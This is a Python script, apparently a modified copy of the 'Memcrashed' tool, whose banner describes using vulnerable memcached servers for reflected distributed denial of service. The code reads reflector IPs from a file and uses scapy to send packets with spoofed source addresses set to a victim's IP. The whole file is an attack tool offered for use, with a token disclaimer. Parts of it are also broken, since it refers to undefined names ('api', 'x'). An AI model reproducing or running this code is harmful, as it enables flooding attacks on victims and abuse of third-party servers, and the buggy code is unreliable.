#-*- coding: utf-8 -*-
#!/usr/bin/env python
import sys, os, time
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

logo = color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝

                                        Author: @037
                                        Version: 4.0
                                    Modded by : PhynX404

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                       
'''
print(logo)

while True:
    try:
        with open('bots.txt') as my_file:
            ip_array = [line.rstrip() for line in my_file]
        target = sys.argv[2]
        targetport = sys.argv[3]
        power = int(sys.argv[4])
        print('')
           # data = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
           # if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
           #     dataset = "set injected 0 3600 ", len(data)+1, "\r\n", data, "\r\n get injected\r\n"
           #     setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
           #     getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
           #     p/rint("[+] Payload transformed: ", dataset)
        setdata = random._urandom(65813)
        getdata = random._urandom(65813)
        counter= int(0)
        for i in ip_array:
            print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
            host = api.host('%s' % x)
            counter=counter+1
            print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
            with suppress_stdout():
               send(IP(src=target, dst='%s' % i) / TCP(sport=int(str(targetport)),dport=targetport)/Raw(load=setdata))
               send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=targetport)/Raw(load=getdata))
        print('')
        print('[•] Task complete! Exiting Platform. Have a wonderful day.')
        break
    except Scapy_Exception as e:
        print(e)
